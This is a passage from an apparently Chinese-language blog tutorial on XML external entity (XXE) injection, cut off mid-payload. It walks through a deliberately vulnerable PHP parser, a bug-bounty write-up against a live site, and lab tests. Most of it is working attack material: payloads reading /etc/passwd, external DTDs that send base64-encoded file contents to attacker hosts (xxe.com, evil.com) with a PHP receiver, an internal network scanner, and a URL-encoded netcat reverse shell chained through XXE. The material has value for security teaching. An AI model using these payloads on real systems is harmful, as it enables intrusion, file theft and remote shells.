<span class="token punctuation">[</span>Wed Nov <span class="token number">16</span> 04:45:23.549126 <span class="token number">2016</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>:error<span class="token punctuation">]</span> <span class="token punctuation">[</span>pid <span class="token number">1379</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>client <span class="token number">192.168</span>.1.17:57042<span class="token punctuation">]</span> PHP Notice: DOMDocument::loadXML<span class="token punctuation">(</span><span class="token punctuation">)</span>: PEReference: %int<span class="token punctuation">;</span> not found <span class="token keyword">in</span> Entity, line: <span class="token number">1</span> <span class="token keyword">in</span> /var/www/html/xmlinject.php on line <span class="token number">5</span>
<span class="token punctuation">[</span>Wed Nov <span class="token number">16</span> 04:45:23.549155 <span class="token number">2016</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>:error<span class="token punctuation">]</span> <span class="token punctuation">[</span>pid <span class="token number">1379</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>client <span class="token number">192.168</span>.1.17:57042<span class="token punctuation">]</span> PHP Notice: DOMDocument::loadXML<span class="token punctuation">(</span><span class="token punctuation">)</span>: PEReference: %trick<span class="token punctuation">;</span> not found <span class="token keyword">in</span> Entity, line: <span class="token number">1</span> <span class="token keyword">in</span> /var/www/html/xmlinject.php on line <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>减少文件大小后，可以获取到，推测应该是 外部实体中的 URI 有长度限制导致无法获取到</p>
<h1 id="XXE的典型案例二"><a href="#XXE的典型案例二" class="headerlink" title="XXE的典型案例二"></a>XXE的典型案例二</h1><h2 id="1-安装并运行起来"><a href="#1-安装并运行起来" class="headerlink" title="1.安装并运行起来"></a>1.安装并运行起来</h2><p>使用以下PHP脚本，它解析发送给它的XML并将其回传给用户。我把它命名为NEW_XXE.php，并把它放在我的Web根目录下的CUSTOM目录中。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$stuff</span> <span class="token operator">=</span> <span class="token variable">$xml</span><span class="token operator">-></span><span class="token property">stuff</span><span class="token punctuation">;</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$stuff</span></span> \n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果要在实验室中创建此场景，你可以将上述脚本放入PHP服务器（要先确保安装了php-xml）</p>
<p>现在创建一个xml文件，作为请求发送到具有以下内容的服务器。我命名为“send.txt”，并将其从服务器上发送到本地主机，以确保一切都符合预期。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234028788-1831295104.gif" alt="2"></p>
<p>你可以把任何你想要的东西，像这样把它发送到本地主机。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234029443-757032783.gif" alt="3"></p>
<h2 id="2-一些External-Entities请求"><a href="#2-一些External-Entities请求" class="headerlink" title="2.一些External Entities请求"></a>2.一些External Entities请求</h2><p>将“send.txt”修改为以下内容：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234029857-680764399.gif" alt="4"></p>
<p>这是对Linux系统的典型XXE攻击，是证明该漏洞存在的好方法。如果一切正常，你应该得到一个“/ etc / passwd”转储（dump）。</p>
<p>从 服务器上 再次发送到本地主机。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234030199-924937140.gif" alt="5"></p>
<p>XXE可以做的另一件非常有用的事情是创建HTTP请求。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234030474-435817466.gif" alt="6"></p>
<p>在WEBSVR01上的8888端口上启动python SimpleHTTPServer，我们来看看会发生什么。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234030805-1043264745.gif" alt="7"></p>
<p>我的python http server服务器。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234031093-1720687788.gif" alt="8"></p>
<p>我们可以发送http请求了。</p>
<p>在远程系统中，我可以利用此漏洞并获取一些网络信息。在这里我解释一下这个漏洞，你可以在互联网上许多的Web服务器上发现这个漏洞，你可以用它作为枢轴点。</p>
<p>下图显示了全部。我在34.200.157.128找到了一个网络服务器，该主机真的是NAT /Firewall设备后面的WEBSVR01。WEBSVR01有一个XXE漏洞，我想用来收集信息并用来攻击利用WEBSRV02。我的攻击PC是在开放的互联网上的。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234031603-77739970.gif" alt="9"></p>
<p>如果你做了适当的信息收集或者枚举，你可以发现这是一个Ubuntu的服务器。你可以在几个敏感的地址查看到这个服务器的网路信息。</p>
<p>首先，你要抓取“/etc/networking/interfaces”，如果需要更多信息，可以查看“/proc/net/route”（如果这些值为十六进制，则可能需要转换它们）。</p>
<p>在我的攻击PC（Ubuntu 14 LTS）中，我创建请求文件从Web服务器抓取“/etc/network/interfaces”。</p>
<p>在ATTACK PC上编辑文件来抓取/etc/passwd：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234031957-788519841.gif" alt="10"></p>
<p>发送请求：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234032448-1106270797.gif" alt="11"></p>
<p>现在我们知道这个内部网络或DMZ的IP方案的host地址是在哪了。我们使用XXE来获取其内部IP地址10.0.0.3得服务器默认页面。</p>
<p>注意：有些字符会破坏XML。到目前为止，我们只查看了文件或者做了简单的http请求，没有返回会破坏我们的XML的字符。由于我们使用的是PHP，所以返回的内容是base64编码的。在ATTACK PC上更改你的“send.txt”以匹配以下内容，并添加以下PHP过滤器。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234032841-290267868.gif" alt="12"></p>
<p>现在发送请求</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234033160-1253468769.gif" alt="13"></p>
<p>现在我们得到了base64编码的内容，一旦解码，我们就得到了网页的内容了。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234033480-195265202.gif" alt="14"></p>
<h2 id="3-构建HTTP扫描器"><a href="#3-构建HTTP扫描器" class="headerlink" title="3.构建HTTP扫描器"></a>3.构建HTTP扫描器</h2><p>将上面的都放在一起，我们现在可以扫描Web服务器的内部IP范围了。</p>
<p>当然使用Python了。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234034123-1490055863.gif" alt="15"></p>
<p>你可以在我的<a target="_blank" rel="noopener" href="https://github.com/rschwass/SCRIPTS/blob/master/XEE_SCANNER.py">GitHub上获取脚本。</a></p>
<p>从ATTACK PC， EXECUTE！</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234034679-762886948.gif" alt="16"></p>
<p>让我们看看Base64如何解码10.0.0.4返回的数据。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234035015-853668418.gif" alt="17"></p>
<p>exploit-db.com上的小漏洞：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/10610/">https://www.exploit-db.com/exploits/10610/</a></p>
<p>因为我们获得了一个index.pl（Perl）文件，所以我要假设CGI是启用的，所以这个漏洞可以执行。它通过在GET请求中传递参数来执行，因此我们可以对面向公网的主机进行XXE漏洞攻击。</p>
<p>解密Metasploit模块后，需要发送的请求就像此URL编码的http请求一样：</p>
<p><a target="_blank" rel="noopener" href="http://10.0.0.4/index.pl?%60mknod%20backpipe%20p%20%26%26%20nc%2034.200.157.80%201337%2">http://10.0.0.4/index.pl?%60mknod%20backpipe%20p%20%26%26%20nc%2034.200.157.80%201337%2</a></p>
<p>00%3Cbackpipe%20%7C%20%2Fbin%2Fbash%201%3Ebackpipe%26%60</p>
<p>注意，我把我的IP地址放在“34.200.157.80”，我的Netcat侦听器就会启动。整个字符串是一个URL编码的反向Netcat外壳，没有使用“-e”来使用mknod和backpipe。</p>
<p>现在让我们通过XXE漏洞来触发10.0.0.4的漏洞。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234035380-906072955.gif" alt="18"></p>
<p>在ATTACK PC上创建Netcat侦听器并执行！</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234036380-1451259729.gif" alt="19"></p>
<p>现在你得到一个反向的Shell了</p>
<h1 id="XXE典型案例三"><a href="#XXE典型案例三" class="headerlink" title="XXE典型案例三"></a>XXE典型案例三</h1><p>那是2016年7月26日的晚上，我游荡在ubermovement网站上，鉴于这只是一个小型应用网站，没有太多的参数可以进行注入测试，我只能先从界面上那大大的搜索框开始常规的测试。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234036909-859563664.gif" alt="u1"></p>
<p>首先，打开我的 Burp Suite 设置代理开始监听浏览器请求，然后就是在网站上瞎转悠咯…</p>
<p>随后，我在网站目录中发现 “search” 存在两个请求：</p>
<p>\1. 这个是我搜索的关键字：<a target="_blank" rel="noopener" href="http://ubermovement.com/api/search/GeneralSearch?crumb=ASmuamNBJiP4eyC3qpXZWu87i5X6PWGh&amp;q=cat&amp;p=0">http://ubermovement.com/api/search/GeneralSearch?crumb=ASmuamNBJiP4eyC3qpXZWu87i5X6PWGh&amp;q=cat&amp;p=0</a></p>
<p>\2. <a target="_blank" rel="noopener" href="http://ubermovement.com/api/search/GeneralSearch">http://ubermovement.com/api/search/GeneralSearch</a></p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234037728-182926868.gif" alt="u2"></p>
<p>现在，对于第一个请求我要开始进行各种测试了，包括：XSS、SQL 注入、XPATH、XXE、命令注入…</p>
<p>但理想总是丰满的，而现实却是骨干的，我没有发现任何可能存在的漏洞。</p>
<p>那我只能开始继续测试第二请求了，由于其没有任何参数，所以我将其发送至 “Repeater” 模块，看看是否可能存在目录相关的漏洞。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234038325-1132770022.gif" alt="u3"></p>
<p>在大部分的注入测试全部失败后，我开始尝试看看是否存在 XXE 漏洞。</p>
<p>第一件事是先将请求方法改为 POST 看看会获得什么样的相应：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234038965-1332523326.gif" alt="u4"></p>
<p>结果，POST 请求的相应跟 GET 请求一样，那么请求头部加一个Content-type:application/xml同时添加如下基本的 XML 代码作为请求怎么样呢？</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=”1.0″encoding=”utf-8″?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>GeneralSearch</span><span class="token punctuation">></span></span>cat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>GeneralSearch</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234039554-1590258656.gif" alt="u5"></p>
<p>竟然回复的是一个 XML 错误，太好了，这下我有60%的把握确定这里存在 XXE 漏洞。既然确定了那就开始进行 Blind XEE 测试吧。</p>
<p>第一个使用如下 XML 代码：</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE dtgmlf6 [ 
	&lt;!ENTITY xxe SYSTEM&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
]&gt;
&lt;GeneralSearch&gt;&amp;xxe;&lt;&#x2F;GeneralSearch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但很不幸，我得到还是一个 XML 错误的回复。那现在来试试通过 OOB(Out-of-band)方法进行远程文件访问测试：</p>
<p>step-1: 在本地上下载安装 XAMPP 并搭建一个网站</p>
<p>step-2: 开启 80 端口的网站，让外部网络能够访问到</p>
<p>step-3: 使用如下 Payoad：</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE dtgmlf6 [
	&lt;!ENTITY dtgmlf6ent SYSTEM &quot;http:&#x2F;&#x2F;0.0.0.0&#x2F;&quot;&gt;
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<GeneralSearch>&dtgmlf6ent;</GeneralSearch>

<p>step-4: 开始攻击，随后得到如下报错</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234040235-1100121240.gif" alt="u6"></p>
<p>step-5: 接着查看服务器日志我发现了来自目标服务器的资源获取请求</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234040660-1835011432.gif" alt="u7"></p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234041849-1178456086.gif" alt="u8"></p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234042559-1178233194.gif" alt="u9"></p>
<p>至此，手工测试已经基本确定了目标存在 XXE 漏洞，那么再让我们用 AWVS 扫描确认下吧。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234043312-143061967.gif" alt="u10"></p>
<p>确定目标存在 XXE 漏洞，那目标的子域名是否同样存在这个漏洞呢？来让我们使用 Google 搜索下就知道了，测试发现目标子域名同样也都存在这个漏洞，好了是时候提交漏洞了。</p>
<h1 id="XXE漏洞测试实列"><a href="#XXE漏洞测试实列" class="headerlink" title="XXE漏洞测试实列"></a>XXE漏洞测试实列</h1><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<h2 id="1-测试代码"><a href="#1-测试代码" class="headerlink" title="1.测试代码"></a>1.测试代码</h2><p>使用simplexml_load_string函数解析body</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token variable">$xml</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2-漏洞测试"><a href="#2-漏洞测试" class="headerlink" title="2.漏洞测试"></a>2.漏洞测试</h2><h3 id="（1）漏洞测试方式一"><a href="#（1）漏洞测试方式一" class="headerlink" title="（1）漏洞测试方式一"></a>（1）漏洞测试方式一</h3><p>有回显，直接读取文件</p>
<p>Payload:</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
	&lt;!ELEMENT name ANY &gt;
	&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;
]&gt;
&lt;root&gt;
	&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="http://obr4sfdq7.bkt.clouddn.com/xxe.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234043904-345953687.gif" alt="http://obr4sfdq7.bkt.clouddn.com/xxe.png"></a></p>
<h3 id="（2）漏洞测试方式二"><a href="#（2）漏洞测试方式二" class="headerlink" title="（2）漏洞测试方式二"></a>（2）漏洞测试方式二</h3><p>无回显，引用远程服务器上的XML文件读取文件</p>
<p>Payload:</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE root [
	&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxe.com&#x2F;1.xml&quot;&gt;
%remote;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>将以下1.xml保存到WEB服务器下<br>1.xml</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % a SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
&lt;!ENTITY % b &quot;&lt;!ENTITY &amp;#37; c SYSTEM &#39;gopher:&#x2F;&#x2F;xxe.com&#x2F;%a;&#39;&gt;&quot;&gt; 
%b; 
%c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="http://obr4sfdq7.bkt.clouddn.com/xxe1.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234044535-315848766.gif" alt="http://obr4sfdq7.bkt.clouddn.com/xxe1.png"></a></p>
<p>查看服务器access.log，可以看到访问日志<br><a target="_blank" rel="noopener" href="http://obr4sfdq7.bkt.clouddn.com/xxe3.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234044835-1172179785.gif" alt="http://obr4sfdq7.bkt.clouddn.com/xxe3.png"></a></p>
<h3 id="（3）漏洞测试方式三"><a href="#（3）漏洞测试方式三" class="headerlink" title="（3）漏洞测试方式三"></a>（3）漏洞测试方式三</h3><p>在主机上放一个接收文件的php(get.php):</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'01.txt'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xxe_local'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>1.xml内容：</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % payload SYSTEM&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;http:&#x2F;&#x2F;xxe.com&#x2F;get.php?xxe_local&#x3D;%payload;&#39;&gt;&quot;&gt;
%int;
%trick;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个XML，他引用了外部实体etc/passwd作为payload的值，然后又将payload拼接到<a target="_blank" rel="noopener" href="http://xxe.com/get.php?xxe_local=%payload;，进行HTTP请求。">http://xxe.com/get.php?xxe_local=%payload;，进行HTTP请求。</a></p>
<p>接收到请求的get.php就将这个文件内容保存到01.txt了，形成了一个文件读取的过程。</p>
<p>发包过去后，就会请求1.xml，解析这个xml造成XXE攻击，读取etc/passwd并进行base64编码后传给get.php，最后保存到主机上<br><a target="_blank" rel="noopener" href="http://obr4sfdq7.bkt.clouddn.com/xxe2.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234045366-819236429.gif" alt="http://obr4sfdq7.bkt.clouddn.com/xxe2.png"></a></p>
<p>查看服务器access.log，可以看到访问日志<br><a target="_blank" rel="noopener" href="http://obr4sfdq7.bkt.clouddn.com/xxe4.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234045720-37310198.gif" alt="http://obr4sfdq7.bkt.clouddn.com/xxe4.png"></a></p>
<p>查看01.txt<br><a target="_blank" rel="noopener" href="http://obr4sfdq7.bkt.clouddn.com/xxe5.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234046082-612884704.gif" alt="http://obr4sfdq7.bkt.clouddn.com/xxe5.png"></a></p>
<p>base64解码<br><a target="_blank" rel="noopener" href="http://obr4sfdq7.bkt.clouddn.com/xxe6.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234046808-800824744.gif" alt="http://obr4sfdq7.bkt.clouddn.com/xxe6.png"></a></p>
<h1 id="XXE漏洞挖掘方法"><a href="#XXE漏洞挖掘方法" class="headerlink" title="XXE漏洞挖掘方法"></a>XXE漏洞挖掘方法</h1><h2 id="1-简单挖掘方法"><a href="#1-简单挖掘方法" class="headerlink" title="1.简单挖掘方法"></a>1.简单挖掘方法</h2><p>提交POST请求XML文件</p>
<p>提交一个POST请求，请求头加上Content-type:application/xml<br>同时添加测试代码</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"encoding="utf-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span>cat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>通过OOB（Out-of-band)方法远程访问文件测试</p>
<p>\1.  自建一个网站开启80端口</p>
<p>\2.  在测试网站提交payload，如下</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE dtgmlf6 [
    &lt;!ENTITY dtgmlf6ent SYSTEM &quot;http:&#x2F;&#x2F;0.0.0.0&#x2F;&quot;&gt;
]&gt;
&lt;GeneralSearch&gt;&amp;dtgmlf6ent;&lt;&#x2F;GeneralSearch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>3.查看网站返回内容<br>4.查看自建服务器访问日志，是否有DTD文件等请求</p>
<h2 id="2-确认XXE漏洞"><a href="#2-确认XXE漏洞" class="headerlink" title="2.确认XXE漏洞"></a>2.确认XXE漏洞</h2><p>出于演示的目的，我们将用到一个Acunetix维护的demo站点，这个站点就是: <a target="_blank" rel="noopener" href="http://testhtml5.vulnweb.com/,">http://testhtml5.vulnweb.com/</a>。这个站点可用于测试Acunetix web扫描器的功能。 访问 <a target="_blank" rel="noopener" href="http://testhtml5.vulnweb.com/">http://testhtml5.vulnweb.com/</a> 站点，点击 ‘Login’下面的 ‘Forgot Password’ 链接。注意观察应用程序怎样使用XML传输数据，过程如下图所示：</p>
<p>请求：</p>
<p><a target="_blank" rel="noopener" href="http://image.3001.net/2017/02/95a566a1d0820afbe83eb2a0b627c8a1.jpg"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234047287-387925438.gif" alt="Image"></a></p>
<p>响应：</p>
<p><a target="_blank" rel="noopener" href="http://image.3001.net/2017/02/e93606466b7f036abf45619ee44c80b6.jpg"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234047617-1097614616.gif" alt="Image"></a></p>
<p>观察上面的请求与响应，我们可以看到，应用程序正在解析XML内容，接受特定的输入，然后将其呈现给用户。为了测试验证XML解析器确实正在解析和执行我们自定义的XML内容，我们发送如下的请求</p>
<p>修改后的请求和响应：</p>
<p><a target="_blank" rel="noopener" href="http://image.3001.net/2017/02/5a9d492d665886b1842a99f5aad5fd10.jpg"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234048357-485380033.gif" alt="Image"></a></p>
<p>如上图所示，我们在上面的请求中定义了一个名为myentity、值为’testing’的实体。 响应报文清晰地展示了解析器已经解析了我们发送的XML实体，然后并将实体内容呈现出来了。 由此，我们可以确认，这个应用程序存在XXE漏洞</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;evil.com&#x2F;?content&#x3D;%file;&#39;&gt;&quot;&gt;
%payload;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root[  
    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;fileter&#x2F;convert.base64-encode&#x2F;resource&#x3D;c:&#x2F;windows&#x2F;win.ini&quot;&gt; 
    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.1.100:8000&#x2F;evil.dtd&quot;&gt;  
    %dtd;   
    %send;
]&gt;
&lt;root&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="3-寻找XXE"><a href="#3-寻找XXE" class="headerlink" title="3.寻找XXE"></a>3.寻找XXE</h2><p>1.检测xml是否被解析</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;
&lt;Prod&gt;
&lt;Prod&gt;
&lt;Type&gt;abc&lt;&#x2F;type&gt;
&lt;name&gt;Bugcrowd&lt;&#x2F;name&gt;
&lt;id&gt;21&lt;&#x2F;id&gt;
&lt;&#x2F;Prod&gt;
&lt;&#x2F;Prod&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>2.检测是否支持外部实体解析</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;YOURIP&#x2F;TEST.ext&quot; &gt;]&gt;
&lt;Prod&gt;
&lt;Prod&gt;
&lt;Type&gt;abc&lt;&#x2F;type&gt;
&lt;name&gt;Bugcrowd&lt;&#x2F;name&gt;
&lt;id&gt;&amp;xxe&lt;&#x2F;id&gt;
&lt;&#x2F;Prod&gt;
&lt;&#x2F;Prod&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="4-XXE注入利用步骤"><a href="#4-XXE注入利用步骤" class="headerlink" title="4.XXE注入利用步骤"></a>4.XXE注入利用步骤</h2><p>在用户可控的XML数据里面将恶意内容写入到实体中，即可导致任意文件读取，系统命令执行等危害。</p>
<h3 id="（1）测试是否允许外部实体引用"><a href="#（1）测试是否允许外部实体引用" class="headerlink" title="（1）测试是否允许外部实体引用"></a>（1）测试是否允许外部实体引用</h3><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root[
    &lt;!ELEMENT root (data)&gt;
    &lt;!ELEMENT data (#PCDATA)&gt;
    &lt;!ENTITY var &quot;tzuxung&quot;&gt;
]&gt;
&lt;root&gt;
    &lt;data&gt;&amp;var;&lt;&#x2F;data&gt;
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="（2）任意文件读取"><a href="#（2）任意文件读取" class="headerlink" title="（2）任意文件读取"></a>（2）任意文件读取</h3><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root[
	&lt;!ELEMENT root (data)&gt;
    &lt;!ELEMENT data (#PCDATA)&gt;
